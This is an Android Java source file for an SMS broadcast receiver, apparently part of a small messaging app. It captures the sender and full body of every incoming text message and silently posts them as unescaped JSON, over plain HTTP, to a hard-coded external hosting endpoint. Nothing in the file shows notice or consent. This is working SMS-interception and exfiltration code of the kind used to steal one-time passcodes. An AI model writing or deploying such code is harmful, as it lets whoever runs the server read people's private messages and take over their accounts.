package com.example.smsapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SmsReceiver extends BroadcastReceiver {

    private static final String API_URL = "http://sql305.byethost32.com/api.php";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }

                    if (messages.length > 0) {
                        String sender = messages[0].getDisplayOriginatingAddress();
                        StringBuilder messageBody = new StringBuilder();
                        for (SmsMessage message : messages) {
                            messageBody.append(message.getMessageBody());
                        }
                        String body = messageBody.toString();

                        Log.d("SMSReceiver", "From: " + sender);
                        Log.d("SMSReceiver", "Body: " + body);

                        new Thread(() -> sendDataToServer(sender, body)).start();
                    }
                }
            }
        }
    }

    private void sendDataToServer(String sender, String body) {
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.get("application/json; charset=utf-8");
        String jsonBody = "{\"sender\":\"" + sender + "\", \"body\":\"" + body + "\"}";

        RequestBody requestBody = RequestBody.create(jsonBody, JSON);
        Request request = new Request.Builder()
                .url(API_URL)
                .post(requestBody)
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                Log.e("SMSReceiver", "Server error: " + response.code());
            } else {
                Log.d("SMSReceiver", "Data sent successfully");
            }
        } catch (IOException e) {
            Log.e("SMSReceiver", "Network error: " + e.getMessage());
        }
    }
}
